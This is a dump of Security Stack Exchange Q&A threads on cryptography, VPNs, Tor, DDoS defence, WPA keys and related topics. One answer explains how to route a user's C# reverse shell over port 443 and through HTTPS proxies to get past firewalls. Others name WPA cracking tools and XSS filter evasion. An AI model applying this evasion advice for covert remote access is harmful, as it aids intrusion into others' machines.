<p>Theoretically speaking, e and d are interchangeable (which is why RSA works)(one must be designated secret and kept secret) but p and q must <strong>always</strong> be kept secret as these allow you to derive d from e and vice versa. However, you need to be extremely careful in your understanding of the private key - does your software store p/q in the private key? If so, you can't publish it as is. Also, when I say interchangeable - once you publish one of that pair (e or d along with your modulus n) you must guard the other <em>with your life</em>. Practically speaking <a href=""https://stackoverflow.com/questions/696472/given-a-private-key-is-it-possible-to-derive-its-public-key"">as Graeme linked to in the comments</a> e is often chosed as a small/fixed value. My comment on e/d being interchangeable clearly does not apply when e is easily determined. Doing this sort of thing therefore has the potential for confusion and mis-implementation. Use a third-party library/don't start publishing private keys.</p>
","9964"
"Is it really better to use port 80 or 443 for outgoing traffic in order to bypass user firewall?","18038","","<p>I recently created a reverse connection shell in C#. I tested it with some computers and I noticed that some computers connected back correctly and I established connection with them but another computer running Windows 7 doesn't seem to work or establish a connection back to me.</p>

<p>I was using port 3001 as a communication port, and I was trying to establish a reverse connection. Any help why this computer doesn't work ? Is using port 80 or 443 as a communication port will help or It is the same as the connectiion is reverse ! In other words, Is it really better to use port 80 or 443 for outgoing traffic in a reverse connection ?</p>
","<p>Port 443 is for SSL. Since SSL is ""opaque"" to outsiders, firewalls cannot see what is going inside it, and cannot do some transparent proxying. Moreover, a lot of the Web uses port 443 (all <code>https://</code> URL). Therefore, port 443 is one of the ports most likely to be open for outgoing connections, even on sites with strict rules.</p>

<p>Note, though, that some sites block <em>all</em> outgoing connections except those which go to a specific proxy. SSL cannot be proxied <em>transparently</em>, but it can be done explicitly (with a <a href=""http://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_Tunneling"" rel=""nofollow""><code>CONNECT</code></a> call). If you want to implement a ""reverse connection shell"" which will work almost everywhere, then you must be able to detect and use a possible proxy for HTTPS.</p>
","31604"
"Verifying encryption in Facebook Messenger secret conversations","18032","","<p>I've just tried Facebook Messenger's secret conversations feature. I started a conversation with Alice on Facebook Messenger for iOS. I noticed the following in <a href=""https://www.facebook.com/help/messenger-app/1084673321594605/?helpref=hc_fnav"" rel=""nofollow noreferrer"">Facebook's online help</a>, under the heading <strong>How do I verify that my secret conversation in Messenger is encrypted?</strong> </p>

<blockquote>
  <p>Both people in a secret conversation have a device key that you can
  compare to verify that the messages are end-to-end encrypted.</p>
  
  <p>To verify that the conversation is encrypted, compare your device key
  with the other person's device key to confirm that they match.</p>
</blockquote>

<p>When I tap through to the device keys pane for a secret conversation, I am presented with keys called ""YOUR KEY"" and ""ALICE'S KEY"". They do not match. The wording above implies to me that I should see two identical keys. Although if they are ""device keys"" then they should be unique to a device and therefore be different. I concluded the help's wording is just unclear.</p>

<p>On that same screen displaying the keys, I read the following message. </p>

<blockquote>
  <p>Your key is the same for all of your secret conversations on this
  device. Alice's key should match the one on their device.</p>
</blockquote>

<p>That seems to say that if Alice sees the same two keys on her device, encryption is ""verified."" So it seems that:</p>

<ol>
<li>A device key is the public key of a keypair generated by the Facebook Messenger app.</li>
<li>By confirming with Alice that her device key is the one I'm using, I authenticate her public key and achieve the ""verification"" Facebook is talking about.</li>
</ol>

<p>If all of this is correct, then I have to ask:</p>

<p>Is this verification process just here to provide some comfort? Or is Facebook Messenger actually vulnerable to MITM attacks? Do paranoid users require an already-secure channel over which to verify keys? Finally, how can I find out more about the implementation of Facebook's secret conversations? </p>
","<p>Facebook Messenger uses the Signal Protocol. This is the same protocol used in Signal and WhatsApp, and works on standard public-key cryptography principles.</p>

<p><em>Your key</em> is your own public key, which others can use to encrypt messages intended for you. <em>Alice's key</em> is Alice's public key you (or anyone else) can use to encrypt messages intended for Alice. The strings presented in the app are actually <em>cryptographic signatures</em> of these keys.</p>

<p>To verify that both you and Alice have the correct keys, you have to compare the cryptographic signature of <em>your key</em> on <em>your device</em> to the cryptographic signature of <em>your key</em> on <em>Alice's device</em> and the cryptographic signature of <em>Alice's key</em> on <em>Alice's device</em> to the cryptographic signature of <em>Alice's key</em> on <em>your device</em>. This should be done over a secure channel, e.g. by meeting with Alice in person and comparing the signatures visually.</p>

<p>When you have verified both keys, MITM should not be possible. This is of course assuming Facebook's implementation of the Signal Protocol is correct and secure.</p>

<p>You can also skip the verification entirely for what's known as Trust On First Use (TOFU). With the TOFU approach you simply blindly assume that the keys are correct the first time, and later if someone attempts a MITM attack, the app will notify you that the keys have changed.</p>

<p>There's a Facebook whitepaper on Messenger Secret Conversations <a href=""https://fbnewsroomus.files.wordpress.com/2016/07/secret_conversations_whitepaper-1.pdf"" rel=""nofollow noreferrer"">here</a> and a formal audit report of the Signal Protocol itself <a href=""https://eprint.iacr.org/2016/1013.pdf"" rel=""nofollow noreferrer"">here</a>.</p>
","145005"
"Why wasn't the KRACK exploit discovered sooner?","18031","","<p>From what I've read, the issue is as simple as performing step 3 of a 4-step handshake and the consequences of performing that step more than once. Considering the complexity of these kinds of algorithms, I'm somewhat surprised that it is so 'simple' of a concept.</p>

<p>How can it be that a system of this complexity was designed without anyone thinking about what would happen if you performed the step twice? In some sense, it feels like this should have been obvious. It's not really a subtle trick, it's a relatively blatantly obvious defect, or at least that's the impression I'm getting.</p>
","<p>The 802.11 specification that describes WPA2 (802.11i) is behind a paywall, and was designed by a few key individuals at the IEEE. The standard was reviewed by engineers, not by cryptographers. The details of the functionality (e.g. retransmission) were not widely known about or studied by security professionals.</p>

<p>Cryptographer Matthew D Green wrote <a href=""https://blog.cryptographyengineering.com/2017/10/16/falling-through-the-kracks/"" rel=""noreferrer"">a blog post</a> about this subject, and I think this section sums it up quite nicely:</p>

<blockquote>
  <p>One of the problems with IEEE is that the standards are highly complex and get made via a closed-door process of private meetings. More importantly, even after the fact, they’re hard for ordinary security researchers to access. Go ahead and google for the IETF TLS or IPSec specifications — you’ll find detailed protocol documentation at the top of your Google results. Now go try to Google for the 802.11i standards. I wish you luck.</p>
  
  <p>The IEEE has been making a few small steps to ease this problem, but they’re hyper-timid incrementalist bullshit. There’s an IEEE program called GET that allows researchers to access certain standards (including 802.11) for free, but only after they’ve been public for six months — coincidentally, about the same time it takes for vendors to bake them irrevocably into their hardware and software.</p>
</blockquote>
","171444"
"How to protect myself against paid DDoS services?","18018","","<p>I am domestic user and I am getting attacked regularly by a guy that hates me.</p>

<p>Here is the background story: that guy uses Skype resolvers (tools offered by paid DDoS services) to find out my IP based on my Skype ID. He does that because I have dynamic IP, so whenever I go online and sign in to Skype, he discovers my new IP using the Skype resolver. Now I know I could avoid this by creating a new Skype ID (which I did) or by using a proxy service for Skype (which is not always convenient), but I wonder how I could prevent the attacks if he discovered my IP through other means.</p>

<p>What I know for sure is that he is using 2-3 paid DDoS services, so he's not conducting the attack from his PC. I have 100 Mbps download and upload capabilities, my CPU is a Core i7-920 (2.7 GHz quad-core) and I am using the Jetico Personal Firewall, and I am on Window 7 x64. When I am getting attacked, there is not much bandwidth use, but the CPU gets stressed up to 50-60% and I am not able to access any internet resources (browsing doesn't work, chat clients go offline, etc.) The firewall does its best to reject the attacks (as you can see in the screen shot bellow), it doesn't crash or hang, but it is not enough. My Internet connection is bridged, so he's not attacking a router, all the packets hit my system directly. Either way, I don't think a router could do better.</p>

<p><img src=""https://i.stack.imgur.com/cWXPF.png"" alt=""enter image description here""></p>

<p>As you can see, all the packets are incoming 40 bytes TCP packets, sent through port 1234 and hitting port 80 on my system (I do not have any service listening on that port, and even if I were, I wouldn't let it be accessed from the outside). I think that the source IPs are spoofed addresses as they come from all over the world. During an attack I get millions of such packets and the only way to stop the attack is by disconnecting from the internet and reconnecting (with a different IP).</p>

<p>My question: <strong>is there any way I can protect myself against such an attack without having to disconnect from the Internet and suffer major CPU stressing?</strong></p>
","<p>Have a dedicated router or firewall to do the filtering.</p>

<p>The reason your CPU is being stressed is that the software firewall on your system is attempting to handle way more packets that your system can tolerate.</p>

<p>Having a hardware router or firewall drop packets before they hit your computer should do the trick. Of course, there IS a limit even to dedicated routers or firewalls. So it really comes down to how much resources the attacker is willing to use to DDoS you.</p>

<p>Besides that, there is really nothing else you can do to stop an attacker, besides coordinating with your ISP to block the incoming packets or reporting the matter to law enforcement.</p>
","21004"
"What is the difference between a penetration test and a vulnerability assessment?","17986","","<p>What is the difference between a penetration test and a vulnerability assessment?</p>

<p>Why would you choose one over the other?</p>

<p>What deliverables would you expect to receive and how would you rate the quality of them?</p>
","<p>I'm sure I posted an answer to this previously, but my google-fu must be weak this morning. From my <strong><a href=""http://infosecfrog.blogspot.co.uk/2011/05/penetration-testing-taxonomy.html"">blog post</a></strong> on Penetration Taxonomy, we have a list of testing types that is gaining acceptance. Also, working with the <strong><a href=""http://www.pentest-standard.org/index.php/Main_Page"">Penetration Testing Execution Standard</a></strong> we hope to further develop this. This list should help explain how to choose one over another. </p>

<p>Deliverables are almost a separate issue - and should be defined by the need and the audience (eg for a governance body you would not expect the same detail as you would provide to a technical remediation team, but you would want to include business risk information). There is also a Reporting stream within PTES development to try and codify this area:</p>

<p><strong>Discovery</strong></p>

<p>The purpose of this stage is to identify systems within scope and the services in use. It is not intended to discover vulnerabilities, but version detection may highlight deprecated versions of software / firmware and thus indicate potential vulnerabilities.</p>

<p><strong>Vulnerability Scan</strong></p>

<p>Following the discovery stage this looks for known security issues by using automated tools to match conditions with known vulnerabilities. The reported risk level is set automatically by the tool with no manual verification or interpretation by the test vendor. This can be supplemented with credential based scanning that looks to remove some common false positives by using supplied credentials to authenticate with a service (such as local windows accounts).</p>

<p><strong>Vulnerability Assessment</strong></p>

<p>This uses discovery and vulnerability scanning to identify security vulnerabilities and places the findings into the context of the environment under test. An example would be removing common false positives from the report and deciding risk levels that should be applied to each report finding to improve business understanding and context.</p>

<p><strong>Security Assessment</strong></p>

<p>Builds upon Vulnerability Assessment by adding manual verification to confirm exposure, but does not include the exploitation of vulnerabilities to gain further access. Verification could be in the form of authorised access to a system to confirm system settings and involve examining logs, system responses, error messages, codes, etc. A Security Assessment is looking to gain a broad coverage of the systems under test but not the depth of exposure that a specific vulnerability could lead to.</p>

<p><strong>Penetration Test</strong></p>

<p>Penetration testing simulates an attack by a malicious party. Building on the previous stages and involves exploitation of found vulnerabilities to gain further access. Using this approach will result in an understanding of the ability of an attacker to gain access to confidential information, affect data integrity or availability of a service and the respective impact. Each test is approached using a consistent and complete methodology in a way that allows the tester to use their problem solving abilities, the output from a range of tools and their own knowledge of networking and systems to find vulnerabilities that would/ could not be identified by automated tools. This approach looks at the depth of attack as compared to the Security Assessment approach that looks at the broader coverage. </p>

<p><strong>Security Audit</strong></p>

<p>Driven by an Audit / Risk function to look at a specific control or compliance issue. Characterised by a narrow scope, this type of engagement could make use of any of the earlier approaches discussed (vulnerability assessment, security assessment, penetration test).</p>

<p><strong>Security Review</strong></p>

<p>Verification that industry or internal security standards have been applied to system components or product. This is typically completed through gap analysis and utilises build / code reviews or by reviewing design documents and architecture diagrams. This activity does not utilise any of the earlier approaches (Vulnerability Assessment, Security Assessment, Penetration Test, Security Audit) </p>
","2841"
"Which type of encryption algorithms android supports, and which would be better?","17986","","<p>I read <a href=""http://developer.android.com/reference/javax/crypto/package-summary.html"" rel=""nofollow"">this</a> documentation, and I have written an algo to encrypt and decrypt a string. But I don't know how many types of algorithms android supports. </p>

<p>Regarding <a href=""http://en.wikipedia.org/wiki/Data_Encryption_Standard"" rel=""nofollow"">DES</a> and <a href=""http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"" rel=""nofollow"">AES</a> (As wiki documentation) there are many types of both, so which one will be better?</p>
","<p>On DES and AES: use AES.</p>

<p>DES and AES are block ciphers: they encrypt data by ""blocks"", where a block is a 64-bit (for DES) or 128-bit (for AES) quantity. To encrypt a ""message"" which is not a single block, you need to use a ""chaining mode"" and possibly a ""padding"": the chaining mode defines how data is split into blocks and assembled again, and the padding consists in extra bytes added at the end of the message so that the total length is appropriate for whatever splitting the chaining mode uses. The padding must be such that, upon decryption, it can unambiguously removed.</p>

<p>The ""standard"" chaining mode and padding are called, respectively, <a href=""http://en.wikipedia.org/wiki/Cipher_block_chaining#Cipher-block_chaining_.28CBC.29"">CBC</a> and <a href=""http://tools.ietf.org/html/rfc2898"">PKCS#5</a>. The PKCS#5 padding adds between 1 and <em>n</em> bytes, where <em>n</em> is the block length (hence 8 for DES, 16 for AES), so that the total padded length is a multiple of <em>n</em>. CBC links blocks together and requires an <em>Initialization Vector</em> (IV) which should be a sequence of <em>n</em> random bytes; it is very important that the IV bytes are generated with a cryptographically strong random number generator (i.e. <code>java.security.SecureRandom</code>) and that you generate a new IV for each message. The IV must also be sent along (unencrypted) with the encrypted message, because the receiver will need it to decrypt the data.</p>

<p>For the block cipher itself: DES comes in two flavors, the ""original"" DES, and ""Triple-DES"", also called ""3DES"" or sometimes simply ""DES"". The original DES uses a 64-bit key, out of which 8 bits are ignored, so the effective key length is 56 bits, and that's too short for security. 3DES uses a 192-bit key (24 bits are ignored, so 168-bit effective key length) and is believed to be robust; it is also three times slower than DES, which is already not that fast.</p>

<p>AES was designed to replace DES, and is generally thought to be better in all respects. AES has three flavors, dubbed AES-128, AES-192 and AES-256, which differ by the key length (of 128, 192 and 256 bits, respectively). 128 bits are more than enough for security, and longer keys imply a slight computational overhead, so a 128-bit key is preferred.</p>

<p>To get a list of algorithms supported by a Java virtual machine, try this:</p>

<pre><code>import java.security.Provider; 
import java.security.Security;
import java.util.Map;
import java.util.TreeSet;

public class ListAlgo {

    public static void main(String[] args)
    {   
        TreeSet&lt;String&gt; algos = new TreeSet&lt;String&gt;();
        for (Provider p : Security.getProviders()) {
            for (Map.Entry&lt;Object, Object&gt; e : p.entrySet()) {
                String s = e.getKey().toString()
                    + "" -&gt; "" + e.getValue().toString();
                if (s.startsWith(""Alg.Alias."")) {
                    s = s.substring(10);
                }               
                algos.add(s);   
            }           
        }       
        for (String a : algos) {
            System.out.println(a);
        }       
    }   
}
</code></pre>

<p>(This is for ""normal"" Java; for Android you will probably need to change things a bit with regards to the final output.)</p>

<p>The encryption algorithms will be those where the string begins by ""<code>Cipher.</code>"". Anyway, if you want the most widely supported algorithm combination, it will be ""<code>AES/CBC/PKCS5Padding</code>"" with a 128-bit key: if a given Android-based supports a single cipher, it will support that one.</p>

<p>If you are in a situation where encryption is warranted, then chances are that you will also need an integrity check; see <code>javax.crypto.Mac</code>. For a MAC, when in doubt, use HMAC with SHA-256 (if SHA-256 is not supported, fallback to HMAC with SHA-1).</p>
","5459"
"VPN blocked ports problem","17967","","<p>I use VPN quite often in public places where I don't want anyone to read my web traffic. However, some public places have firewalls that block ports required to establish a VPN connection (I usually use PPTP). I don't think some public places (especially my school) really distinguish between a VPN connection and HTTP(S) connections. They just block some ports (I think my school is blocking every port except 80, yes even HTTPS!, but I'm not quite sure.).<br>
So I wonder if I can bypass the firewall (maybe by using another port). I can even change the protocol if necessary.<br>
I already use port 80, and 443 for apache and 20, 21, and 22 for FTP, SFTP and SSH on my VPN server. I can use as many domains as necessary but I only have one IP address. Can configure my server so that it uses port 80 for apache if the requests comes from a specific domain and uses port 80 for my VPN server if it comes from another domain.  </p>

<p>The Server is running on Mac OS X Mavericks (a UNIX system) using Mac Server 3.</p>
","<p>You could try OpenVPN running on UDP on port 53, 80, or even its default port.  Many firewalls are not configured to block UDP, and you can have both a UDP service and a TCP service on the same port number.</p>

<blockquote>
  <p>Can configure my server so that it uses port 80 for apache if the
  requests comes from a specific domain and uses port 80 for my VPN
  server if it comes from another domain.</p>
</blockquote>

<p>No.  The operating system doesn't know anything about domains, only IP addresses, protocols, and ports.  So when a packet comes in for port 80 on a certain IP, it looks for what application is listening for TCP on port 80 on that IP, and delivers the packet to it.  Only one application can be on any given IP/Port/Protocol set.</p>

<p>If you had multiple IPs, you could run your VPN on one IP and the webserver on another IP.  Otherwise, ports are what are used to distinguish between applications.</p>
","60831"
"Is posting from HTTP to HTTPS a bad practice?","17945","","<p>Working on the assumption that SSL serves both to encrypt data <strong><em>and</em></strong> to provide assurance as to the identity and legitimacy of the website, should the practice of providing a logon form on a page requested over HTTP be avoided, even when it posts to HTTPS?</p>

<p>The question relates to a post I made yesterday about the <a href=""http://www.troyhunt.com/2011/01/whos-who-of-bad-password-practices.html"">Who's who of bad password practices</a> and some of the feedback suggesting that not visibly seeing the certificate represented in the browser before authenticating was fine if indeed the form posted securely. </p>

<p>To my mind, this sells SSL short as you not only lose the ability to validate the legitimacy of the site before handing over your credentials but you also have no certainty that it <strong><em>is</em></strong> posting over HTTPS. I'm conscious the likes of Twitter and Facebook take this approach, but should they? Am I overlooking something here or is this a practice which should be discouraged?</p>

<p><strong>Update:</strong> I ended up detailing the outcome of this question and subsequent discussion in the blog post <a href=""http://www.troyhunt.com/2011/01/ssl-is-not-about-encryption.html"">SSL is not about encryption</a></p>
","<p>OWASP states:</p>

<p>(copied verbatim from <a href=""http://www.owasp.org/index.php/SSL_Best_Practices"">http://www.owasp.org/index.php/SSL_Best_Practices</a>)</p>

<blockquote>
  <p>Secure Login Pages<br>
  There are several major considerations for securely designing a login page. The following text will address the considerations with regards to SSL.</p>
  
  <p><strong>Logins Must Post to an SSL Page</strong>
  This is pretty obvious. The username and password must be posted over an SSL connection. If you look at the action element of the form it should be https.</p>
  
  <p><strong>Login Landing Page Must Use SSL</strong>
  The actual page where the user fills out the form must be an HTTPS page. If its not, an attacker could modify the page as it is sent to the user and change the form submission location or insert JavaScript which steals the username/password as it is typed.</p>
  
  <p><strong>There must be no SSL Error or Warning Messages</strong>
  The presence of any SSL warning message is a failure. Some of these error messages are legitimate security concerns; others desensitize the users against real security concerns since they blindly click accept. The presence of any SSL error message is unacceptable - even domain name mismatch for the www.</p>
  
  <p><strong>HTTP connections should be dropped</strong>
  If a user attempts to connect to the HTTP version of the login page the connection should be denied. One strategy is to automatically redirect HTTP connections to HTTPS connections. While this does get the user to the secure page there is one lingering risk. An attacker performing a man in the middle attack could intercept the HTTP redirect response and send the user to an alternate page.</p>
</blockquote>

<p>To repeat:  <strong>Login Landing Page Must Use SSL</strong></p>
","1693"
"How to get private key from certificate and base 64 encoded key?","17941","","<p>Sorry for the poor question. Suppose I have a certificate of the following lines:</p>

<pre><code>-----BEGIN CERTIFICATE-----
     //22 Lines of encoded junk
-----END CERTIFICATE-----
</code></pre>

<p>And then this base64 encoded key </p>

<pre><code>&lt;key&gt;
MwqzrZVXYvtwYHaPcrmNbSjPverXXi0OxSivw7K1ZVzLOrKPiSvZQmRoYCKUa356Awow1Goo8pkE5B5qL40AwAELm15c2l04246djdgGBspJhyAJX0K0raxZ5KWsb0jGShetPt8y5WKGiXu4YWqH9abbqsAXzeMQiLlV1mY7n3acurlF53oD8t7MYapWsgPtUVTWW7LqGTnnwZLnnPr/QaZ58/DaiDxLuaGhrmW6xbQM94hH4QgnEE23aCgyjyPjQxYZU5bjX0qeOksaB03uw3bX+DkwSB/fbzXrLGz83WS//z/eiz7Smg3HJ+kmuBmU/79S2Tor7ifkevnCH0RMFg==
&lt;/key&gt;
</code></pre>

<p>Is it possible to get the raw private key, I think something of this nature:</p>

<pre><code>-----BEGIN PRIVATE KEY-----
     //15 lines of encoded junk
-----END PRIVATE KEY-----
</code></pre>

<p>How can I get that? I thik this was all done with openssl. Thanks</p>
","<p>The certificate contains only the public key. <a href=""http://en.wikipedia.org/wiki/Public-key_cryptography"">By construction</a>, it is not feasible to extract or recompute the private key from the public key.</p>
","23861"
"Is WhatsApp or Facebook Messenger secret conversation a reasonable method for transferring passwords?","17929","","<p>I have the Netflix account in our family, meaning I have the password.</p>

<p>It's a secure password, with 16 characters, including symbols, numbers and uppercase, for example <code>3?TeJ)6RK]4Z_a&gt;c</code>, which has around 80 bits of entropy.</p>

<p>However, I have to share this password with other members of the family, so they can also login to it. Is using WhatsApp or Facebook Messenger secret conversation an acceptable method for this?</p>

<p>Are there better methods?</p>
","<p>Both Facebook Messenger (using secret conversations) and WhatsApp implement end-to-end encryption, which means that when you send a message your text is encrypted on your computer and decrypted on the destination computer. The text of your messages is not visible to anyone in between unless they break the encryption, which for practical purposes is not going to happen (unless you happen to be the subject of a national security investigation, in which case you've got bigger problems than sharing your Netflix password with the wonks at the NSA). </p>

<p>However, beware that end-to-end encryption only protects the communication channel itself. It does not protect you from threats such as:</p>

<ul>
<li>Malware, such as keyloggers or screen grabbers that have been installed on your machine or the destination machine</li>
<li>Friends/family who decide to re-share or change your password without your permission</li>
<li>Netflix, who monitors these things and will see that your account is being used in multiple geographic places and thus probably being shared against their terms of service. Netflix has plans that allow multiple streams among family members, so this in itself is not an actionable issue unless your password is somehow shared widely.</li>
<li>Law enforcement, if you happen to <a href=""http://www.pcworld.com/article/229283/live_in_tennessee_careful_with_that_netflix_password.html"" rel=""noreferrer"">live in an area that has criminalized password sharing</a></li>
<li>As pointed out by daniel in the comments, Facebook (who owns both Facebook Messenger and WhatsApp) might accidentally provide weak security or be complicit in breaking user security (e.g. in order to assist a law enforcement investigation). As proprietary applications (not open source) neither of these softwares have been vetted by outside security researchers, so Facebook might have a poor implementation or they might be copying/inspecting your data at either the source or destination device. Additionally, since these applications create and control the encryption keys used to implement the end-to-end encryption, you must assume that Facebook can break the encryption if they so desire (or anyone they would give the keys to, e.g. law enforcement). </li>
<li>Another excellent point from Gert van den Berg in the comments: some messaging apps will automatically back up to the cloud. The security around cloud storage is not nearly as strong as the end-to-end encryption used in the communications channel. See, for example, the Fappening attacks for more info as to how the cloud represents a threat to data privacy. (Even for supposedly deleted data!)</li>
</ul>
","160746"
"What effect has MaxAuthTries=1?","17911","","<p>I configure a new server right now and ask myself what is the internally effect if I set MaxAuthTries=1 in sshd_config.
The server only accept key authentication an no root logins.</p>

<p>Has this setting any effect to prevent brute force logins? </p>

<p>Is there any effect more than closing the tcp socket after MaxAuthTries wrong authentications? Maybe some internal blacklisting for a period or stuff?</p>
","<blockquote>
  <p>MaxAuthTries</p>
  
  <p>Specifies the maximum number of authentication attempts permitted per connection. Once the number of failures reaches half this value, additional failures are logged. The default is 6.</p>
</blockquote>

<p><a href=""https://linux.die.net/man/5/sshd_config"" rel=""nofollow noreferrer"">Man page</a></p>

<p>Setting the value to 1 will mean that your server will only allow 1 login attempt before locking you out.</p>
","42241"
"Get WPA-Passphrase from HEX key and SSID?","17882","","<p>Using this as an example for WPA key calculation (<a href=""http://jorisvr.nl/wpapsk.html"" rel=""nofollow"">link</a>):</p>

<pre><code>Network SSID:   linksys54gh
WPA passphrase: radiustest
Hexadecimal key:    9e9988bde2cba74395c0289ffda07bc41ffa889a3309237a2240c934bcdc7ddb
</code></pre>

<p>I get a hexadecimal key.</p>

<p>I would like to know if there is a possibility to obtain the WPA passphrase by knowing the hexadecimal key and SSID only.</p>

<p>So let's assume I have this:</p>

<pre><code>Network SSID:tomato
Hexadecimal key:    e3c60cdcb07f9b73c5998f02746510b9065be13765a24ca66b5b0f379aba2b08
</code></pre>

<p>How can I obtain the WPA passphrase by knowing the hex Key / SSID? Is it even possible?</p>
","<p>The details of the calculation for obtaining the key are described in the link you mentioned:</p>

<blockquote>
  <p>For WPA-PSK encryption, the binary key is derived from the passphrase
  according to the following formula:</p>
  
  <p>Key = PBKDF2(passphrase, ssid, 4096, 256) The function PBKDF2 is a
  standardized method to derive a key from a passphrase. It is specified
  in RFC2898 with a clear explanation on how to compute it. The function
  needs an underlying pseudorandom function. In the case of WPA, the
  underlying function is HMAC-SHA1.</p>
</blockquote>

<p>PBKDF2 is a key derivation function that uses a hashing algorithm that servers two purposes. One is to make the process of obtaining the inputs of the function very difficult, and the second to make slow down the brute-forcing process.</p>

<p>To my knowledge, there is no published research that would recover the passphrase from the PBKDF2 output in a reasonable time. Your only option is to brute-force it, that means trying every possible passphrase and applying the process you mentioned and seeing if the output matches your key. There is special hardware software and even services to make this process faster. </p>

<p><a href=""http://hashcat.net/wiki/doku.php?id=cracking_wpawpa2"">oclHashcat</a> and <a href=""https://code.google.com/p/pyrit/"">Pyrit</a> will bruteforce WPA and will use GPUs to make the process faster.</p>

<p><a href=""https://www.cloudcracker.com"">CloudCracker</a> service will try 300 million words in 20 minutes for $17 on your keys.</p>
","76981"
"how can you inject malicious code into an innocent-looking URL?","17869","","<p>I am learning about XSS attacks. <a href=""http://en.wikipedia.org/wiki/Cross-site_scripting"">Wikipedia</a> says that in a non-persistent attack an attacker may provide an innocent-looking URL that ""points to a trusted site but actually has an XSS vector."" What would this look like? Can someone provide an example?</p>
","<p>An attacker can use a URL shorting service like bit.ly:</p>

<pre><code>http://bit.ly/114E7Q5
</code></pre>

<p>The XSS'ed site came from <a href=""http://www.xssed.com/"" rel=""nofollow"">http://www.xssed.com/</a> !</p>

<p>If it is a phishing attack and the URL matters,  then the attacker can URL-encode or UTF-8 encode key characters to obscure HTML tags.   Most people disregard long urls anyway.</p>

<p>related:  <a href=""https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet"" rel=""nofollow"">XSS filter Evasion Cheat Sheet</a>. </p>
","34273"
"Downloading through Tor or not Tor?","17865","","<p>If I download a file through TOR, will it be any different than if I download a file through a normal internet browser? I've downloaded stuff through TOR but it's always really slow. I was wondering if I browse through TOR, but then download a file through a normal browser, will it practically be the same thing or completely different?</p>

<p>To be more specific, will it actually show my real IP address and my location if I download through TOR? If it does, then wouldn't downloading from a normal browser be the same?</p>
","<p>There are a couple different answers to this depending on the circumstances...</p>

<h2>Peer to peer downloads (like torrents or filesharing networks)</h2>

<p>If you are talking about downloading data illegally (e.g. copyrighted data in many countries), you shouldn't be doing that in the first place. Be a man and download that movie over the normal internet. If you download lots of data this way, you are using up a lot of CPU and bandwidth from multiple servers around the world and basically clogging up the network. That, too, is something you shouldn't do because the network will cease to be possible if too many people do this.</p>

<p>If you need to download lots of data anonymously and you have <em>a real purpose</em> for being anonymous (e.g. you're a journalist writing a piece on child porn), be my guest and use those resources.<br>
If you're someone wanting to play the latest games without paying, well, I think you know where this is going.</p>

<h2>Downloads from websites</h2>

<p><strong>And you are NOT using https</strong></p>

<p>When connecting over Tor to the open internet (any http:// or ftp:// address), Tor basically works as a proxy server. The website that you download from sends data, a few nodes in the Tor network forward it, and eventually it ends up with you. That is, if everything goes as it should.</p>

<p>What Tor also does is encrypt the traffic inside the Tor network. This means that any MITM attacks on your local network (for example an insecure WiFi network) are not possible. So this is an advantage for using Tor to download things.</p>

<p>On the other hand, you are willingly proxying your traffic through at least one other stranger on the internet that can modify the traffic as desired. That is also a risk to consider, so be sure to validate any checksums if available.</p>

<p>And of course like always, Tor also masks your IP address (and thereby the possibility to find your physical location), which works especially well when you are using the Tails OS or the Tor Browser Bundle.</p>

<p><strong>If you are using https</strong></p>

<p>The only added value of Tor in this case is that it will mask your IP address.</p>

<p><strong>If you are visiting an .onion website and downloading from there</strong></p>

<p>This works much the same as https, except that now it doesn't only mask your IP address, it also masks the server's IP address. Law enforcement and others basically can't monitor that anyone downloaded a file from that server at all. It makes the server anonymous as well as you.</p>

<p><strong>Note</strong> that it may technically be possible to unmask people using Tor if someone really wants to spend millions (billions?) on it, but this is usually not the case. If this is a concern, read more about how Tor works, this answer is certainly not sufficient.</p>
","49799"
"Hiding JavaScript source code","17864","","<p>In a web-app should one strive to hide as much of the code as possible, for example from view source? In particular I was wondering should JavaScript be hidden, especially ones used for Ajax? I was thinking that if the JavaScript was an external file the file could not be on the web server or restricted using <code>.htaccess</code></p>

<p>EDIT: I realize I can't completely prevent the user from seeing JavaScript as it's interpreted on their end. However I was wondering is there a point in detering them from viewing such code, for example making it slightly harder than simply type in <code>www.mywebsite.com/how_login_is_done.js</code></p>
","<p>Javascript code executes on the client browser, so the client browser sees the code, and every user can obtain it. At best you can <a href=""https://stackoverflow.com/questions/194397/how-can-i-obfuscate-javascript"">obfuscate the code</a> so as to (try to) hide its meaning and behaviour. Obfuscation will not deter motivated attackers (it will just makes them a bit angrier), so it would be quite unwise to use it as foundation for your security model.</p>

<p>If you want to hide code, don't send it to the attacker's machine; keep it on the server side.</p>
","30931"
"I'm getting spam e-mail...from myself?","17855","","<p>I noticed yesterday that I had received spam e-mail, but my own e-mail address was listed as the sender.  Naturally, I changed my password.  This is probably a spoof, but I don't know enough about SMTP to understand the e-mail's headers and be sure of it.</p>

<p>I have two questions:</p>

<ul>
<li><strong>Was my e-mail account compromised?</strong></li>
<li><strong>Why would a spammer send mail to me that lists myself as the sender?</strong></li>
</ul>
","<p>SMTP messages have a host of header values that are used by mail servers (Qmail) and mail clients (Outlook, Gmail) for different things.  It's possible your email was set as either the From or the Sender value which was displayed by your mail client.</p>

<p>Here's some info on SMTP from and sender headers: <a href=""http://tools.ietf.org/html/rfc4021#section-2.1.2"">http://tools.ietf.org/html/rfc4021#section-2.1.2</a></p>

<p>As for your questions...</p>

<p>Question 1: No idea.  Getting emails from yourself isn't a guarantee that your account was compromised.  </p>

<p>Question 2: If I were a spammer I would look for ways to confuse digital and organic anti-spam systems.  You could imagine anti-spam filters that automatically whitelist emails that come from the account holder and you can imagine people that get curious about messages that look like they came from themselves.  Those types of messages might be more likely to slip past spam filters and get clicked.</p>

<p>If you want to know more about the message you can investigate the mail headers.  That will show you the sender, the from, the return-path.  You should also be able to see what server your mail server received the message from so that might be a clue.</p>

<p>You could also look in your Sent mail folder.  If someone did compromise your account and send you mail and forgot to hide their tracks, you might see a copy of the message in there.  If you do find a copy in your Sent folder, that's a pretty strong indicator that something is wrong...</p>
","104749"
"How does Dumpper program get default WPS without bruteforcing them?","17854","","<p>Today I tried a program called <a href=""http://sourceforge.net/projects/dumpper/"" rel=""nofollow noreferrer"">Dumpper</a> and the program showed me default WPS of all of my neighbor access points without bruteforcing them, see screenshot below:</p>

<p><img src=""https://i.stack.imgur.com/gsytQ.png"" alt=""enter image description here""></p>

<p>How does this program work?</p>
